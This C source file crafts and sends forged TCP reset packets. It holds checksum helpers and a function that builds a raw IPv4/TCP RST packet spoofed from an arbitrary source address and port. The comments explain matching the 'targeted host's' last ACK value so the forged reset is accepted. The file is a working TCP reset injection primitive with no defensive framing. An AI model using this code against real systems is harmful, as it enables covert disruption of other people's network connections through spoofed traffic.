#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>

// Returns the checksum in net order, ready to go right into the packet.
uint16_t tcp_checksum(unsigned short len_tcp, // host order
                      uint32_t saddr, // net order
                      uint32_t daddr, // net order
                      struct tcphdr* tcp_pkt)
{
    uint16_t* src_addr = (uint16_t*) &saddr;
    uint16_t* dest_addr = (uint16_t*) &daddr;

    unsigned char prot_tcp = 6;
    unsigned long sum = 0;
    int nleft = len_tcp;
    unsigned short* w = (unsigned short *) tcp_pkt;

    // calculate the checksum for the tcp header and tcp data
    while(nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    // if nleft is 1 there ist still on byte left.
    // We add a padding byte (0xFF) to build a 16bit word
    if (nleft > 0)
        sum += *w & ntohs(0xFF00);

    // add the pseudo header
    sum += src_addr[0];
    sum += src_addr[1];
    sum += dest_addr[0];
    sum += dest_addr[1];
    sum += htons(len_tcp);
    sum += htons(prot_tcp);
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    // Take the one's complement of sum
    return (unsigned short) (~sum);
}

// This is really an IP function, but we'll let it slide
uint16_t csum(uint16_t* buf, int nwords, uint32_t init_sum)
{
    uint32_t sum;
    for (sum=init_sum; nwords>0; nwords--)
        sum += ntohs(*buf++);

    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

#define RST_PKT_TOT_LEN (sizeof(struct iphdr) + sizeof(struct tcphdr))

// Send a TCP RST to daddr:dport, spoofed from saddr:sport. seq must be the last
// ACK val observed from the targeted host, so that it won't ignore the ACK.
// saddr, daddr, sport, dport, seq must all be network order.
void tcp_send_rst_pkt(uint32_t saddr, uint32_t daddr,
                      uint16_t sport, uint16_t dport,
                      uint32_t seq)
{
    char rst_pkt_buf[RST_PKT_TOT_LEN];
    struct iphdr* iph = (struct iphdr*)rst_pkt_buf;
    struct tcphdr* th = (struct tcphdr*)(rst_pkt_buf+sizeof(struct iphdr));

    memset(iph, 0, sizeof(struct iphdr));
    iph->ihl = sizeof(struct iphdr) >> 2;
    iph->version     = 4;
    iph->tot_len     = htons(RST_PKT_TOT_LEN);
    iph->frag_off    = htons(0x4000); // don't fragment
    iph->ttl         = 64;
    iph->id          = htons(1337); // no fragment => this field doesn't matter
    iph->protocol    = IPPROTO_TCP;
    iph->saddr       = saddr;
    iph->daddr       = daddr;

    memset(th, 0, sizeof(struct tcphdr));
    th->source     = sport;
    th->dest       = dport;
    th->seq        = seq;
    th->doff       = sizeof(struct tcphdr) >> 2;
    th->rst        = 1;
    th->window     = htons(4096);

    // checksums
    // Yes, correct not to htons this: tcp_checksum returns net order.
    th->check = tcp_checksum(sizeof(struct tcphdr), saddr, daddr, th);
    iph->check = htons(csum((uint16_t*)iph, iph->ihl*2, 0));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = th->dest;
    sin.sin_addr.s_addr = iph->daddr;

    static int our_raw_sock = -1;
    if(our_raw_sock == -1)
        our_raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    sendto(our_raw_sock, rst_pkt_buf, RST_PKT_TOT_LEN,
           0, (struct sockaddr*)&sin, sizeof(sin));
}
